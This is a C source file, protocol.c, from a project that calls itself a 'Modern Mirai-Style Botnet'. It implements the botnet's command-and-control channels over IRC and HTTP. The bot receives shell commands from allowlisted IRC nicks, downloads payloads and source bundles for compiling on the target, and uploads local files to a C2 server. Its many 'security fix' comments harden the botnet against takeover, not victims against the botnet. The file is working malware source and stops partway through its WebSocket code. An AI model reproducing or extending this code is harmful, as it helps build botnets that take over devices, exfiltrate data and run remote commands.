/*
 * notnet - Modern Mirai-Style Botnet
 * protocol.c - C2 protocol implementation (IRC, HTTP, WebSocket)
 */
#include "protocol.h"
#include "spread.h"
#include "payload.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdarg.h>

/* ── IRC Implementation ───────────────────────────────────────── */
static int irc_create_socket(notnet_bot_t *bot) {
    /* SECURITY FIX (#3): Use AF_INET + IPPROTO_TCP (not IPPROTO_IPV6).
     * The previous code requested an IPv6 protocol on an IPv4 socket,
     * which fails silently on most platforms. */
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        log_error("IRC: socket() failed: %s", strerror(errno));
        return -1;
    }
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    /* Set non-blocking for connect timeout */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_irc.port);
    
    /* SECURITY FIX (#3): Use inet_pton instead of gethostbyname + memcpy.
     * gethostbyname returns h_length which can be 16 for IPv6 results,
     * overflowing the 4-byte sin_addr. inet_pton with AF_INET strictly
     * accepts dotted-quad and rejects hostnames. For hostname resolution
     * use getaddrinfo with AF_INET filtering. */
    if (inet_pton(AF_INET, bot->c2_irc.server, &addr.sin_addr) != 1) {
        /* Not a dotted-quad; try DNS resolution and use safe copy */
        int resolved = protocol_resolve_host(bot->c2_irc.server);
        if (resolved == (int)INADDR_NONE) {
            log_error("IRC: DNS resolution failed for %s", bot->c2_irc.server);
            close(sock);
            return -1;
        }
        addr.sin_addr.s_addr = (in_addr_t)resolved;
        if (addr.sin_addr.s_addr == INADDR_NONE) {
            log_error("IRC: invalid address for %s", bot->c2_irc.server);
            close(sock);
            return -1;
        }
    }
    
    /* SECURITY FIX (#10): DNS pinning — on reconnect, verify the resolved
     * IP matches the pinned IP from the first successful auth. */
    if (bot->c2_irc.dns_pinned) {
        if (addr.sin_addr.s_addr != bot->c2_irc.pinned_addr.s_addr) {
            log_warn("IRC: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
                     inet_ntoa(bot->c2_irc.pinned_addr), inet_ntoa(addr.sin_addr));
            close(sock);
            return -1;
        }
    }
    
    /* Non-blocking connect with select() timeout */
    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        log_error("IRC: connect() failed: %s", strerror(errno));
        close(sock);
        return -1;
    }
    
    /* Wait for connection with 3s timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        log_error("IRC: connect() timed out");
        close(sock);
        return -1;
    }
    
    /* Check for connect error */
    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        log_error("IRC: connect() failed: %s", strerror(so_error));
        close(sock);
        return -1;
    }
    
    /* Restore blocking mode for data transfer */
    fcntl(sock, F_SETFL, flags);

    /* SECURITY FIX (#76): Upgrade to TLS and verify cert pin when
     * configured (make TLS=1 + tls_cert_pin_sha256=). */
    if (tls_setup(&bot->c2_irc.tls, sock, bot->c2_irc.server,
                  bot->tls_cert_pin_sha256) != 0) {
        close(sock);
        return -1;
    }

    return sock;
}

int irc_connect(notnet_bot_t *bot) {
    if (bot->c2_irc.connected) return 0;
    
    int sock = irc_create_socket(bot);
    if (sock < 0) return -1;
    
    bot->c2_irc.sock = sock;
    bot->c2_irc.connected = 1;
    bot->c2_irc.last_ping = time(NULL);
    
    log_info("IRC: connected to %s:%d", bot->c2_irc.server, bot->c2_irc.port);
    
    /* Send PASS if configured (loaded from config or env) */
    if (bot->c2_irc.pass[0] != '\0') {
        irc_send(bot, "PASS %s", bot->c2_irc.pass);
    }
    
    /* Send NICK and USER */
    /* SECURITY FIX (#5): Generate a random nick to make impersonation harder */
    {
        char rand_suffix[8];
        random_string(rand_suffix, sizeof(rand_suffix));
        snprintf(bot->c2_irc.nick, sizeof(bot->c2_irc.nick), "%s%s", IRC_NICK_PREFIX, rand_suffix);
        irc_send(bot, "NICK %s", bot->c2_irc.nick);
        irc_send(bot, "USER %s 0 * :notnet bot", bot->c2_irc.nick);
    }
    
    return 0;
}

int irc_send(notnet_bot_t *bot, const char *format, ...) {
    if (!bot->c2_irc.connected) return -1;
    
    char buf[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buf, sizeof(buf), format, args);
    va_end(args);
    
    /* Ensure IRC protocol termination */
    char full_cmd[516];
    snprintf(full_cmd, sizeof(full_cmd), "%s\r\n", buf);
    
    int sent = chan_send(&bot->c2_irc.tls, bot->c2_irc.sock, full_cmd, strlen(full_cmd));
    if (sent < 0) {
        log_error("IRC: send() failed: %s", strerror(errno));
        return -1;
    }
    if (sent < (int)strlen(full_cmd)) {
        log_warn("IRC: partial send (%d of %zu bytes)", sent, strlen(full_cmd));
    }
    
    return sent;
}

int irc_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_irc.connected) return -1;
    
    /* SECURITY FIX (#76): TLS may have decrypted bytes buffered that
     * select() on the raw socket cannot see. */
    if (tls_pending(&bot->c2_irc.tls) <= 0) {
        fd_set fds;
        struct timeval tv;
        FD_ZERO(&fds);
        FD_SET(bot->c2_irc.sock, &fds);
        tv.tv_sec = 0;
        tv.tv_usec = 0;

        if (select(bot->c2_irc.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
    }
    
    int received = chan_recv(&bot->c2_irc.tls, bot->c2_irc.sock, buf, len);
    if (received <= 0) {
        log_info("IRC: connection closed");
        bot->c2_irc.connected = 0;
        close(bot->c2_irc.sock);
        bot->c2_irc.sock = -1;
        return -1;
    }
    
    /* Process IRC response */
    if (received >= len) received = len - 1;
    buf[received] = '\0';
    
    /* Check for PING - must be at start of line for IRC server PING */
    if (strncmp(buf, "PING", 4) == 0) {
        char host[256] = {0};
        char *ping = strstr(buf, "PING");
        char *colon = ping ? strchr(ping, ':') : NULL;
        if (colon) {
            colon++; /* skip colon */
            /* skip leading space after colon */
            while (*colon == ' ') colon++;
            if (*colon) {
                strncpy(host, colon, sizeof(host) - 1);
                host[sizeof(host) - 1] = '\0';
            }
        }
        if (host[0]) {
            irc_send(bot, "PONG %s", host);
            log_debug("IRC: ponged %s", host);
        } else {
            irc_send(bot, "PONG");
        }
    }
    
    /* Check for JOIN confirmation (366 End of NAMES)
     * SECURITY FIX (#29): Use strncmp on the IRC numeric response format
     * instead of strstr("366"). The old check matched any occurrence of
     * "366" anywhere in the buffer, including in PRIVMSG text, allowing
     * any user to trigger false authentication. */
    if (strncmp(buf, ":", 1) == 0) {
        char *space = strchr(buf + 1, ' ');
        if (space) {
            char *code = space + 1;
            /* Format: :server 366 client #chan :End of NAMES list */
            if (strncmp(code, "366", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
                log_info("IRC: joined channel %s", bot->c2_irc.channel);
                bot->c2_irc.authenticated = 1;
                /* SECURITY FIX (#10): Pin the connected peer IP on first auth */
                if (!bot->c2_irc.dns_pinned) {
                    struct sockaddr_in sin;
                    socklen_t slen = sizeof(sin);
                    getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
                    bot->c2_irc.pinned_addr = sin.sin_addr;
                    bot->c2_irc.dns_pinned = 1;
                    log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
                }
            }
        }
    }

    /* Check for MOTD complete (376 End of MOTD) - sets authenticated for non-channels mode
     * SECURITY FIX (#29): Same strstr("376") false-match issue as above. */
    if (strncmp(buf, ":", 1) == 0) {
        char *space = strchr(buf + 1, ' ');
        if (space) {
            char *code = space + 1;
            if (strncmp(code, "376", 3) == 0 && (code[3] == ' ' || code[3] == '\0')) {
                log_info("IRC: MOTD complete, authenticated");
                bot->c2_irc.authenticated = 1;
                /* SECURITY FIX (#10): Pin the connected peer IP on first auth */
                if (!bot->c2_irc.dns_pinned) {
                    struct sockaddr_in sin;
                    socklen_t slen = sizeof(sin);
                    getpeername(bot->c2_irc.sock, (struct sockaddr *)&sin, &slen);
                    bot->c2_irc.pinned_addr = sin.sin_addr;
                    bot->c2_irc.dns_pinned = 1;
                    log_info("IRC: DNS pin set to %s", inet_ntoa(sin.sin_addr));
                }
            }
        }
    }

    /* Process PRIVMSG commands */
    char *privmsg = strstr(buf, "PRIVMSG");
    if (privmsg) {
        /* SECURITY FIX (#5): Verify sender nick against allowlist.
         * IRC PRIVMSG format: :sender_nick!user@host PRIVMSG target :message
         * The nick is the text between the leading ':' and the first '!'. */
        char sender_nick[32] = {0};
        char *colon = buf;  /* buf starts with :nick!user@host ... */
        if (*colon == ':') {
            colon++; /* skip leading colon */
            char *bang = strchr(colon, '!');
            if (bang) {
                int nick_len = bang - colon;
                if (nick_len > 31) nick_len = 31;
                memcpy(sender_nick, colon, nick_len);
                sender_nick[nick_len] = '\0';
            }
        }

        /* Check sender against authorized nicks */
        int authorized = 0;
        for (int i = 0; i < bot->c2_irc.auth_nick_count && i < 8; i++) {
            if (strcmp(sender_nick, bot->c2_irc.auth_nicks[i]) == 0) {
                authorized = 1;
                break;
            }
        }
        /* SECURITY FIX (#11): Constant-time auth check. Instead of
         * returning immediately for unauthorized senders (timing oracle),
         * add a random delay to mask the early return path. */
        if (!authorized) {
            /* Random delay 10-50ms to mask timing differences */
            usleep(10000 + (rand() % 40000));
            log_warn("IRC: PRIVMSG from unauthorized nick '%s' ignored", sender_nick);
            return 0;
        }

        /* Find the message part after the channel name */
        colon = strchr(privmsg, ':');
        if (colon) {
            colon++; /* skip the colon, point to message text */
            /* Trim trailing \r\n */
            int msg_len = strlen(colon);
            while (msg_len > 0 && (colon[msg_len - 1] == '\r' || colon[msg_len - 1] == '\n' || colon[msg_len - 1] == ' ')) {
                colon[--msg_len] = '\0';
            }
            /* Copy full message text as the command (e.g. "exec uname -a") */
            int cmd_len = msg_len;
            if (cmd_len > len - 1) cmd_len = len - 1;
            memmove(buf, colon, cmd_len);
            buf[cmd_len] = '\0';
            log_info("IRC: command: %s", buf);
            return 1; /* signal new command */
        }
    }
    
    return 0;
}

void irc_disconnect(notnet_bot_t *bot) {
    if (bot->c2_irc.connected) {
        bot->c2_irc.connected = 0;
        if (bot->c2_irc.sock >= 0) {
            tls_close(&bot->c2_irc.tls);
            close(bot->c2_irc.sock);
            bot->c2_irc.sock = -1;
        }
        log_info("IRC: disconnected");
    }
}

/* ── HTTP Implementation ───────────────────────────────────────── */
/* SECURITY FIX (#35): Verify a C2 response body echoes the shared
 * secret. The bot only trusts command JSON that contains a "secret"
 * field equal to bot->secret — a MITM who can observe the heartbeat
 * can read the secret, but cannot inject commands the bot will trust
 * without also being able to observe the secret echo in real time.
 * Whitespace around the colon is tolerated. Returns 1 if the body
 * carries the secret, 0 otherwise. */
static int http_body_has_secret(notnet_bot_t *bot, const char *body) {
    if (!bot || !body || bot->secret[0] == '\0') return 0;
    const char *key = strstr(body, "\"secret\"");
    while (key) {
        const char *p = key + strlen("\"secret\"");
        while (*p == ' ' || *p == '\t') p++;
        if (*p == ':') {
            p++;
            while (*p == ' ' || *p == '\t') p++;
            if (*p == '"') {
                const char *val = p + 1;
                const char *end = strchr(val, '"');
                if (end) {
                    size_t vlen = (size_t)(end - val);
                    if (vlen == strlen(bot->secret) &&
                        strncmp(val, bot->secret, vlen) == 0) {
                        return 1;
                    }
                }
            }
        }
        key = strstr(p, "\"secret\"");
    }
    return 0;
}

int http_connect(notnet_bot_t *bot) {
    if (bot->c2_http.connected) return 0;
    
    log_info("HTTP: attempting connect to %s:%d", bot->c2_http.server, bot->c2_http.port);
    
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    /* Non-blocking connect */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_http.port);
    
    /* SECURITY FIX (#3): Use inet_pton + safe fallback instead of
     * gethostbyname + memcpy (h_length overflow on IPv6 results). */
    if (inet_pton(AF_INET, bot->c2_http.server, &addr.sin_addr) != 1) {
        addr.sin_addr.s_addr = (in_addr_t)protocol_resolve_host(bot->c2_http.server);
        if (addr.sin_addr.s_addr == INADDR_NONE) {
            close(sock);
            return -1;
        }
    }
    
    /* SECURITY FIX (#10): DNS pinning for HTTP C2 */
    if (bot->c2_http.dns_pinned && addr.sin_addr.s_addr != bot->c2_http.pinned_addr.s_addr) {
        log_warn("HTTP: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
                 inet_ntoa(bot->c2_http.pinned_addr), inet_ntoa(addr.sin_addr));
        close(sock);
        return -1;
    }
    
    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }
    
    /* Wait with 3s timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        close(sock);
        return -1;
    }
    
    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        close(sock);
        return -1;
    }
    
    fcntl(sock, F_SETFL, flags);
    
    /* SECURITY FIX (#76): Upgrade to TLS + verify cert pin when configured. */
    if (tls_setup(&bot->c2_http.tls, sock, bot->c2_http.server,
                  bot->tls_cert_pin_sha256) != 0) {
        close(sock);
        return -1;
    }

    bot->c2_http.sock = sock;
    bot->c2_http.connected = 1;
    /* SECURITY FIX (#45): Do NOT pin the peer IP here on the raw connect.
     * The first (unauthenticated) connection must not become the trusted
     * pin — an on-path attacker who intercepts the first DNS resolution
     * could pin their own IP, permanently defeating the rebinding
     * protection. Pinning happens in http_read() only after a successful
     * command/response round-trip proves the peer is the real C2. */
    log_info("HTTP: connected to %s:%d", bot->c2_http.server, bot->c2_http.port);
    return 0;
}

int http_post(notnet_bot_t *bot, const char *data, int len) {
    if (!bot->c2_http.connected) return -1;
    
    log_info("HTTP: heartbeat sent (%d bytes)", len);
    
    char headers[1024];
    snprintf(headers, sizeof(headers),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/json\r\n"
        "User-Agent: %s\r\n"
        "Content-Length: %d\r\n"
        "Connection: keep-alive\r\n"
        "\r\n",
        bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent, len);
    
    /* SECURITY FIX (#28): Check send() return values to detect connection
     * drops. Previously sent headers+body without checking if they were
     * actually transmitted. */
    int sent = chan_send(&bot->c2_http.tls, bot->c2_http.sock, headers, strlen(headers));
    if (sent < 0) {
        log_warn("HTTP: failed to send headers: %s", strerror(errno));
        return -1;
    }
    sent = chan_send(&bot->c2_http.tls, bot->c2_http.sock, data, len);
    if (sent < 0 || sent < len) {
        log_warn("HTTP: failed to send body (sent %d of %d): %s", sent, len, strerror(errno));
        return -1;
    }

    return 0;
}
/* Forward declaration: tcp_connect_sock defined below (used by http_get). */
static int tcp_connect_sock(notnet_bot_t *bot, const char *host, uint16_t port);

int http_get(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_http.connected) return -1;

    /* SECURITY FIX (#47): GET runs on a dedicated fresh connection, never
     * on the shared keep-alive POST socket. The heartbeat POST response
     * (which carries C2 commands) is read by http_read() on the shared
     * socket; issuing a GET on the same socket risks attributing the GET
     * response to a pending POST response (or vice versa). A dedicated
     * Connection: close request isolates the request/response pair. */
    int sock = tcp_connect_sock(bot, bot->c2_http.server, bot->c2_http.port);
    if (sock < 0) {
        log_warn("HTTP: GET connect failed: %s", strerror(errno));
        return -1;
    }

    char req[1024];
    int reqlen = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent);

    int sent = send(sock, req, reqlen, 0);
    if (sent < 0 || sent != reqlen) {
        log_warn("HTTP: GET send failed: %s", strerror(errno));
        close(sock);
        return -1;
    }

    /* Read response with 10s timeout to prevent indefinite blocking.
     * NOTE: this is a dedicated plaintext connection (tcp_connect_sock),
     * not the TLS-upgraded channel socket, so raw send/recv apply. */
    int total = 0;
    while (total < len - 1) {
        fd_set read_fds;
        struct timeval tv;
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        tv.tv_sec = 10;
        tv.tv_usec = 0;

        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
        if (sel <= 0) break;  /* timeout or error */

        int received = recv(sock, buf + total, len - total - 1, 0);
        if (received <= 0) break;
        total += received;
    }
    buf[total] = '\0';
    close(sock);

    return total;
}

int http_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_http.connected) return -1;
    
    log_info("HTTP: http_read polling fd %d...", bot->c2_http.sock);
    
    /* Read response from existing connection (non-blocking) */
    if (tls_pending(&bot->c2_http.tls) <= 0) {
        fd_set fds;
        struct timeval tv;
        FD_ZERO(&fds);
        FD_SET(bot->c2_http.sock, &fds);
        tv.tv_sec = 0;
        tv.tv_usec = 0;

        int sel_result = select(bot->c2_http.sock + 1, &fds, NULL, NULL, &tv);
        log_info("HTTP: http_read select returned %d", sel_result);
        if (sel_result <= 0) return 0;
    }
    
    int received = chan_recv(&bot->c2_http.tls, bot->c2_http.sock, buf, len);
    log_info("HTTP: http_read recv returned %d", received);
    if (received <= 0) {
        log_info("HTTP: connection closed (recv=%d)", received);
        bot->c2_http.connected = 0;
        close(bot->c2_http.sock);
        bot->c2_http.sock = -1;
        return -1;
    }
    
    log_info("HTTP: received %d bytes: %.200s", received, buf);
    if (received >= len) received = len - 1;
    buf[received] = '\0';

    /* SECURITY FIX (#45): Pin the peer IP on the first *successful*
     * exchange instead of on the raw connect. Receiving a valid HTTP
     * response here proves the peer answered our request — the earliest
     * point at which we have evidence this is the real C2. Subsequent
     * connects are still checked against the pin in http_connect(). */
    if (received > 0) {
        struct sockaddr_in sin;
        socklen_t slen = sizeof(sin);
        if (getpeername(bot->c2_http.sock, (struct sockaddr *)&sin, &slen) == 0) {
            if (!bot->c2_http.dns_pinned) {
                bot->c2_http.pinned_addr = sin.sin_addr;
                bot->c2_http.dns_pinned = 1;
                log_info("HTTP: DNS pin set to %s after first response",
                         inet_ntoa(sin.sin_addr));
            }
        }
    }
    return received;
}

/* Open a fresh blocking TCP connection to host:port with a 3s timeout.
 * Returns socket fd on success, -1 on failure. Caller must close. */
static int tcp_connect_sock(notnet_bot_t *bot, const char *host, uint16_t port) {
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;

    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
        in_addr_t resolved = (in_addr_t)protocol_resolve_host(host);
        if (resolved == INADDR_NONE) {
            close(sock);
            return -1;
        }
        addr.sin_addr.s_addr = resolved;
    }

    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }

    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;

    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        close(sock);
        return -1;
    }

    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        close(sock);
        return -1;
    }

    fcntl(sock, F_SETFL, flags);
    (void)bot;
    return sock;
}

int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
    /* Parse the target URL. Fall back to the configured C2 endpoint
     * when url is NULL/empty so the old callers keep working. */
    char host[256];
    uint16_t port;
    char path[512];

    if (url && strncmp(url, "http://", 7) == 0) {
        char authority[256];
        const char *p = url + 7;
        const char *slash = strchr(p, '/');
        size_t alen = slash ? (size_t)(slash - p) : strlen(p);
        if (alen == 0 || alen >= sizeof(authority)) {
            log_error("HTTP download: malformed URL %s", url);
            return -1;
        }
        memcpy(authority, p, alen);
        authority[alen] = '\0';

        snprintf(host, sizeof(host), "%s", authority);
        port = 80;
        char *colon = strrchr(host, ':');
        if (colon) {
            *colon = '\0';
            port = (uint16_t)atoi(colon + 1);
            if (port == 0) port = 80;
        }
        if (slash) snprintf(path, sizeof(path), "%s", slash);
        else snprintf(path, sizeof(path), "/");
    } else {
        snprintf(host, sizeof(host), "%s", bot->c2_http.server);
        port = bot->c2_http.port;
        snprintf(path, sizeof(path), "%s", bot->c2_http.path);
    }

    /* Stream the response body to dest. The old implementation buffered
     * the entire response in a PAYLOAD_MAX_SIZE (64KB) stack array, which
     * truncated the on-target compilation source bundle (~270KB). Headers
     * are buffered small; body bytes are written to the file incrementally
     * with a generous cap (callers that need strict limits validate the
     * result themselves, e.g. payload_update checks PAYLOAD_MAX_SIZE). */
    enum { HDR_BUF_SIZE = 8192, MAX_DOWNLOAD_SIZE = 32 * 1024 * 1024 };
    char hdr_buf[HDR_BUF_SIZE];
    int hdr_len = 0;
    int body_start = -1;   /* offset in hdr_buf where body begins, -1 until found */

    int sock = tcp_connect_sock(bot, host, port);
    if (sock < 0) {
        log_error("http_download: connect to %s:%u failed", host, port);
        return -1;
    }

    char req[1024];
    int reqlen = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host, bot->c2_http.user_agent);

    if (send(sock, req, reqlen, 0) != reqlen) {
        log_warn("http_download: GET send failed: %s", strerror(errno));
        close(sock);
        return -1;
    }

    /* Read response with 10s timeout. First pass: collect headers until
     * the \r\n\r\n terminator (or the header buffer fills). */
    while (body_start < 0 && hdr_len < HDR_BUF_SIZE - 1) {
        fd_set read_fds;
        struct timeval tv;
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        tv.tv_sec = 10;
        tv.tv_usec = 0;

        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
        if (sel <= 0) break;  /* timeout or error */

        int received = recv(sock, hdr_buf + hdr_len, HDR_BUF_SIZE - hdr_len - 1, 0);
        if (received <= 0) break;
        hdr_len += received;
        hdr_buf[hdr_len] = '\0';
        char *hdr_end = strstr(hdr_buf, "\r\n\r\n");
        if (hdr_end) {
            body_start = (int)(hdr_end - hdr_buf) + 4;
            break;
        }
    }
    if (body_start < 0) {
        log_error("http_download: malformed HTTP response from %s:%u", host, port);
        close(sock);
        return -1;
    }

    /* SECURITY FIX (#69): verify the HTTP status line is 2xx. Previously a
     * 404/500 HTML error page was treated as a successful download — the
     * payload magic/hash checks then rejected it, but the failure was
     * attributed to the wrong cause and the on-target compile fallback
     * never fired. Check the status line before trusting the body. */
    {
        char *status = hdr_buf;
        char *sp = strstr(status, " ");
        if (sp && sp[1] >= '0' && sp[1] <= '9' &&
            sp[2] >= '0' && sp[2] <= '9' &&
            sp[3] >= '0' && sp[3] <= '9') {
            int code = (sp[1] - '0') * 100 + (sp[2] - '0') * 10 + (sp[3] - '0');
            if (code < 200 || code >= 300) {
                log_error("http_download: HTTP %d from %s:%u (path %s)",
                          code, host, port, path);
                close(sock);
                return -1;
            }
        } else {
            log_error("http_download: malformed status line from %s:%u", host, port);
            close(sock);
            return -1;
        }
    }

    /* Open destination and write the body. */
    FILE *f = fopen(dest, "wb");
    if (!f) {
        log_error("http_download: cannot open %s: %s", dest, strerror(errno));
        close(sock);
        return -1;
    }

    int body_len = 0;
    int in_hdr = hdr_len - body_start;
    if (in_hdr > 0) {
        fwrite(hdr_buf + body_start, 1, in_hdr, f);
        body_len = in_hdr;
    }

    /* Continue streaming remaining body bytes. */
    char stream_buf[8192];
    while (body_len < MAX_DOWNLOAD_SIZE) {
        fd_set read_fds;
        struct timeval tv;
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        tv.tv_sec = 10;
        tv.tv_usec = 0;

        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
        if (sel <= 0) break;  /* timeout, EOF, or error */

        int received = recv(sock, stream_buf, sizeof(stream_buf), 0);
        if (received <= 0) break;
        fwrite(stream_buf, 1, received, f);
        body_len += received;
    }
    fclose(f);
    close(sock);

    if (body_len <= 0) {
        log_error("http_download: empty body from %s:%u", host, port);
        unlink(dest);
        return -1;
    }
    if (body_len >= MAX_DOWNLOAD_SIZE) {
        log_error("http_download: body exceeds cap (%d bytes) from %s:%u",
                  body_len, host, port);
        unlink(dest);
        return -1;
    }

    return body_len;
}

int http_upload(notnet_bot_t *bot, const char *file_path, const char *upload_path) {
    /* Read local file into memory */
    FILE *f = fopen(file_path, "rb");
    if (!f) {
        log_error("http_upload: cannot open %s: %s", file_path, strerror(errno));
        return -1;
    }

    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (file_size <= 0 || file_size > PAYLOAD_MAX_SIZE) {
        log_error("http_upload: invalid file size %ld", file_size);
        fclose(f);
        return -1;
    }

    char *file_data = (char *)malloc(file_size);
    if (!file_data) {
        log_error("http_upload: malloc failed for %ld bytes", file_size);
        fclose(f);
        return -1;
    }

    size_t nread = fread(file_data, 1, file_size, f);
    fclose(f);

    if ((long)nread != file_size) {
        log_error("http_upload: short read (%zu of %ld)", nread, file_size);
        free(file_data);
        return -1;
    }

    /* Use configured C2 endpoint or specific URL */
    char host[256];
    uint16_t port;
    char path[512];

    if (upload_path && strncmp(upload_path, "http://", 7) == 0) {
        char authority[256];
        const char *p = upload_path + 7;
        const char *slash = strchr(p, '/');
        size_t alen = slash ? (size_t)(slash - p) : strlen(p);
        if (alen == 0 || alen >= sizeof(authority)) {
            log_error("http_upload: malformed URL %s", upload_path);
            free(file_data);
            return -1;
        }
        memcpy(authority, p, alen);
        authority[alen] = '\0';

        snprintf(host, sizeof(host), "%s", authority);
        port = 80;
        char *colon = strrchr(host, ':');
        if (colon) {
            *colon = '\0';
            port = (uint16_t)atoi(colon + 1);
            if (port == 0) port = 80;
        }
        if (slash) snprintf(path, sizeof(path), "%s", slash);
        else snprintf(path, sizeof(path), "/");
    } else {
        snprintf(host, sizeof(host), "%s", bot->c2_http.server);
        port = bot->c2_http.port;
        snprintf(path, sizeof(path), "%s", upload_path ? upload_path : bot->c2_http.path);
    }

    /* Connect to server */
    int sock = tcp_connect_sock(bot, host, port);
    if (sock < 0) {
        log_error("http_upload: connect to %s:%u failed", host, port);
        free(file_data);
        return -1;
    }

    /* Build POST request with Content-Length */
    char headers[1024];
    int hdr_len = snprintf(headers, sizeof(headers),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %ld\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host, file_size, bot->c2_http.user_agent);

    if (send(sock, headers, hdr_len, 0) != hdr_len) {
        log_warn("http_upload: headers send failed: %s", strerror(errno));
        close(sock);
        free(file_data);
        return -1;
    }

    /* Send file body */
    int sent = send(sock, file_data, file_size, 0);
    free(file_data);

    if (sent < 0 || sent < file_size) {
        log_warn("http_upload: body send failed (sent %d of %ld): %s", sent, file_size, strerror(errno));
        close(sock);
        return -1;
    }

    /* Read response with timeout */
    char buf[1024];
    int total = 0;
    while (total < (int)sizeof(buf) - 1) {
        fd_set read_fds;
        struct timeval tv;
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        tv.tv_sec = 10;
        tv.tv_usec = 0;

        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
        if (sel <= 0) break;

        int received = recv(sock, buf + total, (int)sizeof(buf) - total - 1, 0);
        if (received <= 0) break;
        total += received;
    }
    buf[total] = '\0';
    close(sock);

    log_info("http_upload: uploaded %ld bytes to %s, response: %.200s", file_size, path, buf);
    return file_size;
}

void http_disconnect(notnet_bot_t *bot) {
    if (bot->c2_http.connected) {
        bot->c2_http.connected = 0;
        if (bot->c2_http.sock >= 0) {
            tls_close(&bot->c2_http.tls);
            close(bot->c2_http.sock);
            bot->c2_http.sock = -1;
        }
        log_info("HTTP: disconnected");
    }
}

/* ── WebSocket Implementation ─────────────────────────────────────── */
/* ── WebSocket RFC 6455 Handshake Helpers ────────────────────── */

/* Minimal base64 encoder (RFC 4648). dst must hold >= 4*((len+2)/3)+1 bytes. */
static void ws_base64_encode(const uint8_t *src, int len, char *dst, int dst_size) {
    static const char tbl[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, o = 0;
    while (i < len && o < dst_size - 4) {
        uint32_t a = src[i], b = (i + 1 < len) ? src[i + 1] : 0, c = (i + 2 < len) ? src[i + 2] : 0;
